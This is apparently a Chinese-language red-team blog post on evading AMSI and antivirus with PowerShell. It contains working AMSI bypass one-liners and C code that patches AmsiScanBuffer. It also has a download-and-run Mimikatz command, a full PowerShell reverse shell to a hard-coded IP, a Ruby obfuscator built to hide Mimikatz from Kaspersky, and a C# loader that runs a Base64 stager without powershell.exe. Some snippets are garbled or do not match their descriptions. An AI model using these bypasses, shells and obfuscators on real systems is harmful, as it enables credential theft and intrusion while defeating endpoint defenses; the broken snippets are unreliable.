#  PowerShell 漏洞 - 现代 APT 及其恶意脚本策略   
 Ots安全   2025-02-16 12:06  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
在这篇博客中，我们将首先介绍 PowerShell，解释为什么它是红队成员最喜欢的工具。从那里，我们将探索它的内存加载功能，并详细了解 AMSI（反恶意软件扫描接口），包括它的深入运作方式。然后，我将从理论上详细和实践上向您介绍绕过 AMSI 的方法，使用三个简单但有效的 PowerShell 命令行（脚本小子会特别喜欢这部分）。  
  
接下来，我们将介绍如何滥用 .NET 功能来运行 PowerShell 命令而无需实际使用 PowerShell本身，以及如何使用 Invoke-Obfuscation 等工具逃避检测。一些使用 C ^_^ 进行 AMSI 内存修补的示例。我们还将研究高级持续性威胁(APT) 如何创建自定义混淆器以成功实现逃避技术。  
  
此外，我们还将讨论鲜为人知的 CLSID 劫持等技术，探索有效但未充分利用的 LOLBins ，最后介绍PowerLoad3r 等高级工具的真实示例。  
  
我希望您觉得本指南内容丰富且引人入胜，其中包含大量实用见解，可增强您的红队工作，您猜怎么着？我们将进行的所有绕过和测试都将针对卡巴斯基 EDR :)，并希望它可以加快或帮助您的红队参与。  
  
  
- 什么是 PowerShell？  
PowerShell 是微软为系统管理员和高级用户提供的“瑞士军刀”。它诞生于 2006 年，是一种强化版的命令行 shell 和脚本语言。  
  
PowerShell 的特殊之处如下：  
- 它是面向对象的， PowerShell 不仅可以处理文本，还可以处理结构化数据。这意味着您可以轻松地在命令之间操作和传输复杂信息。  
  
- 它基于 .NET 构建：这使 PowerShell 能够深入访问 Windows 内部，并使其在系统管理方面具有极其强大的功能。  
  
- PowerShell 最初仅适用于 Windows，现在也可在 Linux 和 macOS 上运行。  
  
无论您管理的是一台笔记本电脑还是一组云服务器，PowerShell 都能为您提供更快、更高效地完成任务的工具。对于任何认真对待 Windows 管理或 DevOps 的人来说，它都是首选工具。  
  
- 为什么红队成员和渗透测试人员喜欢 PowerShell  
  
PowerShell 已牢固确立了其作为红队和渗透测试的基石的地位。原因如下：   
- 它预装在 Windows 上，因此攻击者不需要添加额外的工具，从而更难检测到。  
  
- 它可以利用 Windows 的核心系统和 .NET，让攻击者窃取凭证、跨网络移动或提取数据等。  
  
- 从找到目标到维持访问，PowerShell 处理攻击的每个步骤。  
  
- 脚本可以被隐藏或扰乱，使得防御者难以抓住它们。  
  
- 它可与 Azure 和 AWS 等云平台配合使用，非常适合应对现代攻击。  
  
PowerShell 不仅仅是一个工具——它还是应对现代攻击面的不可或缺的盟友。  
  
PowerShell 及其内存加载功能  
PowerShell 的内存执行是红队梦寐以求的工具。原因如下：  
- 代码直接在 RAM 中运行，不会在磁盘上留下任何痕迹。这使得防病毒和安全工具很难检测到。  
  
- 攻击者可以动态地生成、修改和混淆代码，从而快速适应不同的环境并逃避安全措施。  
  
- 整个框架和复杂工具都可以加载到内存中，使攻击者无需安装软件即可获得全套功能。  
  
- 一旦进入系统，内存执行就会促进从凭证收集到横向移动的一切，同时保持低调。  
  
Invoke-Expression Cmdlet — 启用内存执行  
Invoke-Expression（IEX）允许在当前会话中将字符串作为 PowerShell 命令执行。它是内存执行的关键工具。  
  
```
Invoke-Expression "Get-Process"
```  
  
  
此命令运行“Get-Process”并返回活动进程列表。Invoke-Expression与其他 cmdlet 或 .NET 方法结合使用时功能更加强大，可实现复杂的内存命令执行。  
  
  
使用 IEX 进行内存加载和执行  
与.DownloadString从WebClient类结合时，IEX可以完全在内存中下载并运行脚本。  
  
```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowershellMafia/Powersploit/refs/heads/master/Exfiltration/Invoke-Mimikatz.ps1')
```  
  
- New-Object Net.WebClient创建一个WebClient用于检索资源的实例。  
  
- .DownloadString('URL')从提供的 URL 下载脚本。  
  
- IEX在内存中执行下载的脚本。  
  
该方法可以秘密执行，绕过磁盘存储并使检测更加困难。  
  
一旦你尝试执行它“BOOM”  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taegB05Ve4ZIB108iaBNHv7LItVDEWDGUoAibUcHMnN1hOiapFwDYySFgmFc3bIPtN8hXylH0Qgxsqxhw/640?wx_fmt=webp&from=appmsg "")  
  
然而，当代 Windows 版本已使用反恶意软件扫描接口 (AMSI) 加强了防御，以抵御此类脚本下载和执行尝试。AMSI 集成到 Windows 10 安全措施中，旨在检测和阻止基于脚本的规避技术，阻止绕过传统防病毒解决方案的企图。AMSI 是一种强大的防御机制，可防止潜在的恶意脚本执行，包括利用 PowerShell 内存加载功能的脚本执行。  
  
AMSI 的运作方式  
反恶意软件扫描接口 (AMSI) 代表深度集成到 Windows 操作系统的复杂安全框架。本分析深入探讨了其复杂的操作机制、高级功能和不断发展的能力。  
  
核心架构  
  
AMSI 利用组件对象模型 (COM) 接口实现 Windows、应用程序和防病毒解决方案之间的顺畅交互。这些接口促进了无缝通信和集成，从而有效地检测恶意软件。AMSI 架构的关键组件包括：  
- amsi.dll是促进扫描操作的中央 AMSI 库  
  
- AmsiScanBuffer和AmsiScanString函数分别负责扫描内存数据缓冲区和字符串以查找潜在威胁  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taegB05Ve4ZIB108iaBNHv7LIkx3Ne5SAnhpLVfDfttnWibthuQfSk5FvMUxrXPzgfxcicrqGIhczBL9g/640?wx_fmt=webp&from=appmsg "")  
  
实际上 AmsiScanString 只是使用 AmsiScanBuffer :)  
- IAntimalwareProvider：防病毒软件用于与 AMSI 集成的接口，允许第三方安全解决方案在 AMSI 框架内参与威胁检测。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taegB05Ve4ZIB108iaBNHv7LI1CUMsiajnpaLetVWOaHBibtGNU0afl6zeNjpDhv67RsSEeRgVuyjvRbQ/640?wx_fmt=webp&from=appmsg "")  
  
AMSI   
  
初始化和注册过程  
系统启动时，反恶意软件扫描接口 (AMSI) 会进行结构化初始化，以便与 Windows 应用程序和防病毒解决方案无缝集成：  
1. AMSI 服务在启动过程的早期进行初始化，确保扫描框架已准备好处理来自应用程序和服务的请求。  
  
1. 防病毒解决方案通过IAntimalwareProvider接口向 AMSI 注册。此注册允许防病毒产品与 AMSI 集成，使其能够参与扫描过程。  
  
1. 能够识别 AMSI 的应用程序（例如 PowerShell 和 Microsoft Office）会加载该amsi.dll库。此动态链接库 (DLL) 对于 AMSI 执行的扫描操作至关重要。  
  
1. 这些应用程序使用以下函数配置其扫描上下文AmsiInitialize：  
  
```
HRESULT AmsiInitialize( LPCWSTR appName, HAMSICONTEXT *amsiContext );
```  
  
  
该函数为每个应用程序创建一个唯一的上下文，允许特定于应用程序的扫描策略。appName参数指定应用程序的名称，amsiContext参数是指向将在后续 AMSI API 调用中使用的句柄的指针。  
  
内存扫描功能  
AMSI 执行内存扫描的能力是检测直接在系统内存中运行的复杂、无文件恶意软件的关键功能，从而逃避传统的基于磁盘的检测方法。  
  
该AmsiScanBuffer功能是此功能的核心：  
  
```
HRESULT AmsiScanBuffer(  HAMSICONTEXT amsiContext,  PVOID buffer,  ULONG length,  LPCWSTR contentName,  HAMSISESSION amsiSession,  AMSI_RESULT *result);
```  
  
  
此功能使 AMSI 能够检查原始内存缓冲区，从而有助于检测以下高级威胁：  
- 直接在内存中加载和执行的脚本，绕过磁盘存储和传统的基于文件的扫描。  
  
- 试图直接从内存执行代码的恶意软件，通常通过反射 DLL 注入等技术。  
  
情境感知扫描  
  
AMSI 利用基于会话的扫描来维护跨多个扫描的上下文，从而实现更准确的风险评估。  
  
该AmsiOpenSession函数用于在现有 AMSI 上下文中创建会话：  
  
```
HRESULT AmsiOpenSession（  HAMSICONTEXT amsiContext，  HAMSISESESSION *amsiSession ）；
```  
  
  
  
上下文感知扫描  
  
AMSI利用基于会话的扫描来维护多次扫描的上下文，从而实现了更准确的风险评估。  
  
AmsiOpenSession函数用于在现有AMSI上下文中创建会话：  
  
```
HRESULT AmsiOpenSession(  HAMSICONTEXT amsiContext,  HAMSISESSION *amsiSession);
```  
  
- amsiContext ：AMSI上下文的手柄，从AmsiInitialize获得。  
  
- amsiSession ：将代表新会议的指针指向手柄。  
  
此功能在成功后返回S_OK或HRESULT错误代码失败。  
  
通过打开会话，应用程序可以分组多个扫描请求，从而允许AMSI跟踪执行流并做出更明智的决定。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taegB05Ve4ZIB108iaBNHv7LIOa32K5KiaTR9XXh4ibprBulcvl1vS07MRBPv2iaDAwrvtDexCGCUj7jnQ/640?wx_fmt=webp&from=appmsg "")  
  
  
检查Powershell  
判决决定判决结果  
AMSI 收集所有提供商的回复，并使用加权评分系统确定最终裁决：  
1. 每个提供商都返回从 AMSI_RESULT_CLEAN 到 AMSI_RESULT_MALWARE 的结果。  
  
1. AMSI 汇总这些结果，并根据提供商的声誉和置信度对其进行加权。  
  
1. 最终裁决决定采取何种行动：  
  
- 允许执行  
  
- 阻止执行并通知应用程序  
  
- 触发附加日志记录、警报或二次扫描  
  
下载 Mimikatz 的挑战：  
  
当您尝试直接使用 IEX 方法下载并执行 Mimikatz 时，AMSI 会在执行之前拦截脚本内容。鉴于 Mimikatz 的恶名及其可识别的恶意模式，AMSI 很可能会识别并随后阻止其执行。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taegB05Ve4ZIB108iaBNHv7LIlbefLZfXApHR2CaaqjChdu28xGpFicaI8A1W2icrCSGGicboF8TWuWHFg/640?wx_fmt=webp&from=appmsg "")  
  
AMSI 检测到了  
这种 AMSI 干预使得直接下载和在内存中执行 Mimikatz 等臭名昭著的脚本变得相当困难。逃避或绕过 AMSI 成为此类脚本运行的关键。  
  
为什么直接下载 Mimikatz 是有问题的：  
  
当您尝试使用 IEX 方法直接下载并执行 Mimikatz 脚本时，AMSI 会在脚本执行之前捕获脚本内容。鉴于 Mimikatz 具有已知的恶意模式，AMSI 可能会标记并阻止执行。  
  
这使得如果不先绕过或逃避 AMSI，直接下载和在内存中执行 Mimikatz 等知名脚本变得非常困难。  
  
因此， PowerShell 在内存操作方面的强大功能无疑是强大的。然而，微软的内置安全措施，尤其是 AMSI，对直接的恶意行为构成了重大障碍。网络安全机制和规避策略之间的这种不断发展和相互作用体现了该领域的动态性质，需要不断学习和适应。  
  
使用 Import-Module 加载 Mimikatz  
  
将 Mimikatz 加载到 PowerShell 会话的另一种方法是使用 Import-Module cmdlet：  
  
```
Import-Module .\Invoke-Mimikatz.ps1
```  
  
  
什么是 Import-Module？ Import-Module cmdlet 是一个内置的 PowerShell 命令，用于向当前会话添加一个或多个模块。在 PowerShell 的上下文中，模块是一个包含 PowerShell 成员（包括 cmdlet、提供程序、函数、变量等）的包。  
  
导入模块的工作原理：  
1. 首先，PowerShell 在当前目录中搜索指定的模块，在本例中为 .\Invoke-Mimikatz.ps1。如果未找到，PowerShell 将检查预定义的模块路径。  
  
1. 接下来，如果存在模块清单文件 (.psd1)，PowerShell 将读取它以确定模块的属性、依赖项和任何所需的程序集。之后，所有必要的 .NET 程序集都会加载到 PowerShell 进程中。  
  
1. 一旦找到脚本文件 (Invoke-Mimikatz.ps1)，它就会在单独的范围内执行。此执行定义了模块中包含的所有函数、变量和别名。只有明确导出的项目或所有项目（如果未设置限制）才会提供给当前会话。  
  
1. 导出的项目随后会集成到会话的函数和变量表中，这样就可以像本机命令一样直接访问它们。为了提高性能，模块会缓存在内存中，以便在后续导入时更快地访问。  
  
1. 如果模块依赖于其他模块或脚本，PowerShell 也会递归导入这些模块或脚本。此外，在执行模块中的任何代码之前，PowerShell 都会检查系统的执行策略，以确保允许运行该模块。  
  
最后，需要注意的是，模块中定义的内部变量与当前会话中的变量是隔离的。这种隔离可防止模块变量与现有会话变量之间发生冲突，从而确保操作平稳并降低出错风险。  
  
值得注意的是，即使你从磁盘导入模块，如果模块的任何部分被执行，AMSI 仍然可以扫描并可能阻止其内容。  
  
- 混淆和绕过 AMSI（概述）  
混淆是一种使代码难以理解的方法。这就像写一条只有您知道如何阅读的秘密消息。当我们谈论 AMSI 时，混淆通常用于尝试欺骗它。  
  
大多数混淆技术针对 AMSI 的工作方式如下：  
1. 隐藏真实含义 → 混淆会改变代码的外观，但不会改变其功能。例如，您可能不会写“Hello”，而是写“H”+“e”+“l”+“l”+“o”。它仍然表示“Hello”，但看起来不同。  
  
1. 使事情变得混乱 —> 混淆会添加一些不重要的额外内容。这就像在句子中添加随机单词以混淆读者一样。  
  
1. 使用奇怪的名称，而不是使用代码中事物的清晰名称，混淆使用随机或误导性的名称。这使得 AMSI 更难猜测代码正在做什么。  
  
1. 例如，使用编码时，“Hello” 在 Base64 编码后可能会变成“SGVsbG8=”。AMSI 可能无法立即识别这一点。  
  
- Invoke-Obfuscation（第一个技巧）  
  
Invoke-Obfuscation 由 Daniel Bohannon 创建，是一种用于混淆 PowerShell 脚本以避免被发现的工具，常用于红队行动。  
  
为了更深入地了解 Invoke-Obfuscation 及其应用，您可能会发现以下视频很有启发：https://www.youtube.com/watch?v =uE8IAxM_BhE  
  
在给定的脚本中，正在执行反向 shell 有效负载，概述如下 -> Github - Payload All The Things - Powershell Reverse Shell：  
  
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient( "192.168.1.4" , 4242 );$stream = $client.GetStream();[byte[]]$bytes = 0 .. 65535 | %{0}; while (($i = $stream.Read($bytes, 0 , $bytes.Length)) - ne 0 ){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0 , $i);$sendback = (iex $data 2 >& 1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> " ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0 ,$sendbyte.Length);$stream.Flush()};$client.Close()
```  
  
  
在启动混淆后，有效载荷会经历变形，变得模糊，但保留其核心功能，如下所示：  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taegB05Ve4ZIB108iaBNHv7LIplxG28ia4N2Ng3dFb8efzxMmYGpTmlp2tm0iciapDDkvG2CvsLkoDgsww/640?wx_fmt=webp&from=appmsg "")  
> “我已针对&nbsp;Windows&nbsp;Defender&nbsp;和卡巴斯基测试了该工具，它成功避开了这些程序，没有任何问题。这就是我将其添加到博客的原因。:)”  
  
  
- PowerShell 中 3 种简单有效的 AMSI 绕过技术  
  
基于反射的绕过此方法使用 .NET 反射通过将其内部 amsiInitFailed 标志设置为 true 来禁用 AMSI。  
  
```
$t =[Ref].Assembly.GetType(( 'System.Manage' + 'ment.Automa' + 'tion.AmsiUtils' )); $f = $ t.GetField(( 'amsiIn' + 'itFailed' ), 'NonPublic,Static' ); $ f.SetValue( $null , $true )
```  
  
- 它访问 System.Management.Automation 程序集中的 AmsiUtils 类。  
  
- 它将 amsiInitFailed 字段设置为 true，强制 AMSI 初始化失败  
  
- 字符串被拆分（'System.Manage'+'ment.Automa'+'tion.AmsiUtils'）以逃避静态检测。  
  
Base64 + ASCII 混淆 此方法使用 Base64 和 ASCII 编码混淆关键字符串以避免被检测到。  
  
```
$s =[System.Text.Encoding] :: UTF8.GetString ([Convert] :: FromBase64String ( 'U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=' )); $t =[Ref].Assembly.GetType( $s ); $ t.GetField([System.Text.Encoding] :: ASCII.GetString (( 97 , 109 , 115 , 105 , 73 , 110 , 105 , 116 , 70 , 97 , 105 , 108 , 101 , 100 )), 'NonPublic,Static' ).SetValue( $null , $true );
```  
  
- 从 Base64 解码“System.Management.Automation.AmsiUtils”。  
  
- 将“amsiInitFailed”从 ASCII 字节值转换。  
  
- 使用反射来禁用 AMSI。  
  
最小反射旁路这是基于反射的旁路的更清晰版本。  
  
```
$t =[Ref].Assembly.GetType(( 'System.Manage' + 'ment.Automa' + 'tion.AmsiUtils' )); $f = $ t.GetField(( 'amsiIn' + 'itFailed' ), 'NonPublic,Static' ); $ f.SetValue( $null , $true );
```  
  
  
- C 语言中的 AMSI 修补技术  
  
本节深入探讨了使用 C 语言编程修补反恶意软件扫描接口 (AMSI) 的各种方法。每种技术都进行了详细解释，包括其基本原理、实现和潜在影响。  
  
使用 WriteProcessMemory 进行函数修补  
  
该技术涉及直接覆盖内存中 AMSI 函数的代码。  
  
```
HMODULE amsiDll = LoadLibraryA("amsi.dll");FARPROC functionAddr = GetProcAddress(amsiDll, "AmsiScanBuffer");unsignedchar patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};WriteProcessMemory(GetCurrentProcess(), functionAddr, patch, sizeof(patch), NULL);
```  
  
  
  
- OpenProcess() 获取目标进程的句柄- 我们在 AMSI DLL 中  
  
找到该函数- 该数组包含指令- WriteProcessMemory() 将此代码注入目标进程的内存空间- 我们关闭进程  
句柄以清理资源AmsiOpenSession  
  
bypassXOR RAX, RAX  
  
函数挂钩  
  
这种方法涉及将 AMSI 函数重定向到自定义实现。  
  
```
FARPROC functionAddr = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");DWORD oldProtect;VirtualProtect(functionAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);memcpy(functionAddr, "\x74", 1);VirtualProtect(functionAddr, 1, oldProtect, &oldProtect);
```  
  
-  我们找到AmsiScanBuffer函数  
  
- -hook数组包含0xE9，这是 x86/x64 汇编中近跳转的操作码  
  
- - 这是 5 字节跳转指令的第一个字节  
  
- - 实现将涉及计算和写入跳转偏移量以重定向到自定义函数  
  
- 高级威胁行为者和高级持续性威胁 (APT)  
APT 通常会创建自定义混淆工具，而不是使用公开工具。这些定制工具通过不为安全系统所知、利用特定弱点和频繁更新来逃避检测。它们结合了多种技术、使用零日漏洞并适应其环境，使 APT 能够长期访问受感染的系统。  
  
为了强调这一点，让我们对 0xNinjacCyclone 创建的令人难以置信的 Ruby 脚本表示赞赏：  
  
```
#!/usr/bin/ruby# Author => Abdallah Mohamed ( 0xNinjaCyclone )# Email => elsharifabdallh53@gmail.com# Why? => For 0xHossam's upcoming blogrequire'pathname'# The script pathSCRIPT_PATH = "Invoke-Example.ps1"# The commands you want to executeINVOCATIONS = [    "Invoke-Example -Arg Value",    "Invoke-Example -Arg Value2"]# Maximum random string lengthMAX_LENGTH = 8Obfuscated = Struct.new(:original, :obfuscated)Functions = []Arguments = []Variables = []defreserved?(argname)    ['$$',        '$?',        '$^',        '$_',        '$AccessMask',        '$AllNodes',        '$Args',        '$Bitfield',        '$Command',        '$Constructor',        '$Charset',        '$ConsoleFileName',        '$DllName',        '$DsDomainFlag',        '$EnabledExperimentalFeatures',        '$ErrorActionPreference',        '$Error',        '$Event',        '$EventArgs',        '$EventSubscriber',        '$ExecutionContext',        '$False',        '$ForEach',        '$FunctionName',        '$FunctionDefinitions',        '$Home',        '$Host',        '$IsCoreCLR',        '$IsLinux',        '$IsMacOS',        '$IsWindows',        '$Input',        '$Kernel32',        '$LastExitCode',        '$LogonType',        '$Matches',        '$MyInvocation',        '$MarshalAs',        '$NativeCallingConvention',        '$NestedPromptLevel',        '$Module',        '$ModuleName',        '$Namespace',        '$NULL',        '$OFS',        '$Object',        '$ParameterTypes',        '$PermissionSet',        '$PEInfo',        '$PID',        '$Profile',        '$PSBoundParameters',        '$PsCmdlet',        '$PSCommandPath',        '$PsCulture',        '$PSDebugContext',        '$PSHOME',        '$PSItem',        '$PSScriptRoot',        '$PSSenderInfo',        '$PsUICulture',        '$PsVersionTable',        '$PWD',        '$ReturnType',        '$Sender',        '$SetLastError',        '$ShellID',        '$StackTrace',        '$StartAddress',        '$switch',        '$This',        '$True',        '$Value',        '$Win32Constants'].map( &:downcase ).include?( argname.downcase )enddefprint_slowly(msg)    msg = "\033[0;36m#{msg}\033[0m"    msg.each_char { |c| print(c); sleep(0.01) }; putsenddefduplicated?(random_str)    Functions.each do|i|returntrueif random_str == i.obfuscated end    Arguments.each do|i|returntrueif random_str == i.obfuscated end    Variables.each do|i|returntrueif random_str == i.obfuscated end    returnfalseenddefobfuscated?(varname)    Arguments.each do|i|returntrueif varname.downcase == i.obfuscated.downcase end    Variables.each do|i|returntrueif varname.downcase == i.original.downcase end    returnfalseenddefgenerate_random_str    [ *"a".."z" , *"A".."Z" ].sample( MAX_LENGTH ).joinenddefobfuscate_funcs(script)    script.scan(/^\s*Function ([a-zA-Z0-9_-]{6,})[\s\{]+$/i) { |funcs|        begin obf = generate_random_str() endwhile duplicated?(obf)        funcs.each { |f|            print_slowly("Obfuscate #{f} function (#{f}/#{obf})")            Functions << Obfuscated.new(f, obf)             script = script.gsub(/#{f}\b/, obf)        }    }    return scriptenddefobfuscate_args(script)    stack = []    params_found = false    script.split(/\n/).each { |line|                 params_found = trueif line.match?(/\bparam\b/i)         if params_found then            line.each_char { |c|                stack << '('if c.eql?('(')                stack.pop if c.eql?(')') && !stack.empty?            }            line.scan(/(\$\w{3,})/) { |argsInLine|                argsInLine.each { |a|                    begin obf = '$' + generate_random_str() endwhile duplicated?(obf)                    nextif reserved?(a)                    print_slowly("Obfuscate #{a[1..]} argument (#{a[1..]}/#{obf[1..]})")                    Arguments << Obfuscated.new(a, obf)                     script = script.gsub(/\$#{a[1..]}\b/, obf)                    script = script.gsub(/#{a.sub('$', '-')}\b/, obf.sub('$', '-'))                }            }            params_found = falseif stack.empty?        end    }    return scriptenddefobfuscate_vars(script)    script.split(/\n/).each { |line|        line.scan(/(\$\w{6,})/) { |vars|            begin obf = '$' + generate_random_str() endwhile duplicated?(obf)            vars.each { |var|                nextif obfuscated?(var) || reserved?(var)                print_slowly("Obfuscate #{var[1..]} variable (#{var[1..]}/#{obf[1..]})")                Variables << Obfuscated.new(var, obf)                 script = script.gsub(/\$#{var[1..]}\b/i, obf)            }        }    }    return scriptenddefremove_comments(script)    multiple_comments = false    script.split(/\n/).each { |line|        l = line.lstrip        script = script.sub(line, '') if l.start_with?('#')        multiple_comments = trueif l.start_with?('<#')        if multiple_comments then            script = script.sub(line + "\n", '')            multiple_comments = falseif l.include?('#>')        end    }    print_slowly "All comments have been removed"    return scriptenddefsave_output(script)    pn = Pathname.new( SCRIPT_PATH )    dir, _ = pn.split    newfile = dir.join( generate_random_str() + ".ps1" )    File.write(newfile, script)    print_slowly "Obfuscated script saved at #{newfile}"enddeffind_obfucated_func(funcname)    Functions.each { |f|        return f.obfuscated.sub("$", "-") if funcname.eql?(f.original)    }    returnnilenddeffind_obfuscated_arg(argname)    Arguments.each { |a|        return a.obfuscated.sub("$", "-") if argname.downcase.eql?(a.original.downcase)    }    returnnilenddefdisplay_obfuscated_commands    INVOCATIONS.each { |line|        s = line.split(' ')        obf_func = find_obfucated_func( s[0] )                if obf_func.nil? then            print_slowly "[#{s[0]}] this function doesn't exist in this script"            return        end        line = line.sub(s[0], obf_func)                s[1..-1].each { |i|            nextunless i.include?('-')            obf_arg = find_obfuscated_arg( i.sub("-", "$") )            line = line.sub(i, obf_arg) unless obf_arg.nil?        }        print_slowly "The obfuscated command -> '#{line}' "            }enddefdisplay_obfuscated_total    print_slowly "Total obfuscated functions = #{Functions.length}"    print_slowly "Total obfuscated arguments = #{Arguments.length}"    print_slowly "Total obfuscated variables = #{Variables.length}"enddefmain()    script = File.read( SCRIPT_PATH )     script = obfuscate_funcs( script )    script = obfuscate_args( script )    script = obfuscate_vars( script )    script = remove_comments( script )    display_obfuscated_commands()    display_obfuscated_total()    save_output( script )endmain() if File.exists?( SCRIPT_PATH )
```  
  
  
它是如何工作的？  
此 Ruby 脚本是一个概念验证 (PoC)，旨在通过随机重命名函数、变量和参数来混淆 PowerShell 脚本（如 Invoke-Mimikatz.ps1）。它旨在使分析复杂化，使安全工具更难检测或分析脚本，这对于红队操作或渗透测试很有用。  
  
该脚本包括一组需要混淆的 PowerShell 命令（INVOCATIONS），例如和等常用命令coffee（sekurlsa::logonpasswords该脚本无法修改这些命令，因为更改这些值需要修改二进制文件本身；该脚本仅混淆函数名称和参数）。  
  
主要的混淆过程通过生成随机字母数字字符串（最多 8 个字符）来替换函数、参数和变量的名称。这种随机化可确保没有两个混淆是相同的。每个生成的名称都会经过检查，以确保它尚未被使用，从而防止重复。  
  
对于函数，obfuscate_funcs 方法会扫描脚本中的函数定义，将其名称替换为随机字符串，并存储混淆后的名称以供日后使用。同样，obfuscate_args 方法处理参数的混淆，而 obfuscate_vars 则专注于变量名称。  
  
该脚本使用 remove_comments 方法从 PowerShell 脚本中删除所有注释。这会删除单行 (#) 和多行 (<#…#>) 注释，使脚本更难阅读。  
  
混淆完成后，脚本会打印转换后的命令，显示原始命令是如何被改变的。它还会输出混淆的函数、参数和变量的数量。最后，它将修改后的脚本保存到一个随机名称的新文件中。  
  
实际应用及检测测试：  
  
这种混淆方法显著改变了 PowerShell 脚本，使得安全工具更难根据已知模式和签名进行检测。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taegB05Ve4ZIB108iaBNHv7LIuvZibK0pMibG2W0iaktS3D0xN4Gk8gExwPmn7mr9mAApWh7Ebz1Od9gZQ/640?wx_fmt=webp&from=appmsg "")  
  
未经任何混淆的主要工具的检测：  
  
该脚本已针对卡巴斯基互联网安全软件进行了测试，以证明其有效性。图片显示了在没有任何混淆的情况下对主要工具的检测以及混淆后检测率的降低。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taegB05Ve4ZIB108iaBNHv7LIJP7AmxicsTibEyModykJ0IBibVU3rJM7rLbwtTPIicRWKkicZpJmkONWicbQ/640?wx_fmt=webp&from=appmsg "")  
  
运行脚本而不被 Kaserpsky 检测到  
  
注意：“在实际情况下，我们不能简单地通过混淆器运行 Mimikatz 之类的工具并期望它们无法被检测到。Mimikatz 之类的工具具有众所周知的签名，并且许多YARA 规则可以根据其独特的模式识别它们。因此，仅依靠自动混淆工具可能不够。为了在使用此类工具时有效绕过检测，我们还必须结合手动混淆技术。但请尝试一下！”  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taegB05Ve4ZIB108iaBNHv7LIlJEbgHU8oZtibgRds9nOTVvmqx7opPHYyobsk58uMe19eBYRILtBfEg/640?wx_fmt=webp&from=appmsg "")  
  
混淆后 Virus-Total 的检测率  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48taegB05Ve4ZIB108iaBNHv7LIml6tJ7fvh5KX9qObBGtqPq4v6ZibUba9RVJlwhvlozMNmBs7fxRWhSg/640?wx_fmt=webp&from=appmsg "")  
  
针对 Windows Defender  
  
- 使用 powerpick 绕过控制??  
  
PowerPick 成为红队和渗透测试人员武器库中的关键工具，旨在秘密执行 PowerShell 脚本。这种创新工具绕过了对传统二进制文件的需求，这是安全监控系统的常见重点。PowerPick 的方法通常称为“非托管 PowerShell”，允许脚本直接通过 PowerShell 引擎执行。这种方法大大降低了 PowerShell 活动的可见性，使 PowerPick 成为谨慎操作的首选。powershell.exe  
  
- 增强 PowerPick 的规避能力：不使用 powershell 即可使用 powershell  
  
PowerPick 无需生成 powershell.exe 即可执行 PowerShell 脚本，而是使用 .NET 程序集来实现更隐秘的方法。  
  
修改 PowerPick 以实现更隐秘执行的示例  
  
在此示例中，我们演示了如何修改 C# .NET 应用程序以通过 .NET 程序集加载和执行 PowerShell 代码，并了解其幕后工作原理  
  
```
using System;using System.Text;using System.Collections.ObjectModel;using System.Management.Automation;using System.Management.Automation.Runspaces;namespaceSharpPick{    classProgram    {        ///<summary>        /// Executes a PowerShell command without launching powershell.exe        ///</summary>        ///<param name="command">The PowerShell script to execute</param>        ///<returns>Output of the PowerShell command as a string</returns>        staticstringExecutePowerShellCommand(string command)        {            try            {                // Initialize the Runspace (PowerShell environment)                using (Runspace runspace = RunspaceFactory.CreateRunspace())                {                    runspace.Open();                    RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);                    Pipeline pipeline = runspace.CreatePipeline();                    // Add the PowerShell command to the pipeline                    pipeline.Commands.AddScript(command);                    // Add the "Out-String" cmdlet to capture output as a string                    pipeline.Commands.Add("Out-String");                    // Execute the pipeline                    Collection<PSObject> results = pipeline.Invoke();                    // Combine all the results into a single string                    StringBuilder stringBuilder = new StringBuilder();                    foreach (PSObject obj in results)                    {                        stringBuilder.AppendLine(obj.ToString());                    }                    // Return the resulting string, trimmed to remove extra whitespace                    return stringBuilder.ToString().Trim();                }            }            catch (Exception ex)            {                Console.WriteLine($"Error executing PowerShell command: {ex.Message}");                returnstring.Empty;            }        }        staticintMain(string[] args)        {            try            {                // Base64-encoded stager                string base64Stager = "Your stages goes here";                // Decode the Base64-encoded stager to a string                string decodedStager = Encoding.Unicode.GetString(Convert.FromBase64String(base64Stager));                // Execute the decoded PowerShell stager and capture the result                string output = ExecutePowerShellCommand(decodedStager);                // Log the result (for debugging purposes)                Console.WriteLine("PowerShell Output: ");                Console.WriteLine(output);                return0;            }            catch (Exception ex)            {                Console.WriteLine($"Error in Main: {ex.Message}");                return1;            }        }    }}
```  
  
  
它究竟是如何运作的？  
- 该Runspace对象是使用创建的RunspaceFactory.CreateRunspace()。这会在 .NET 运行时中分配一个专用的执行环境，并且运行空间是一个单独的线程，用于处理 PowerShell 脚本的执行  
  
- 在运行空间内创建一个Pipeline对象，用于处理命令的顺序执行。当您添加命令（如Get-Process）时，它会被编译成中间形式并传递到管道，然后执行  
  
- 添加到管道的每个命令都会被翻译成将CommandProcessor 脚本转换为字节码以供执行。这发生在运行空间内，避免了对外部进程的需求，例如powershell.exe  
  
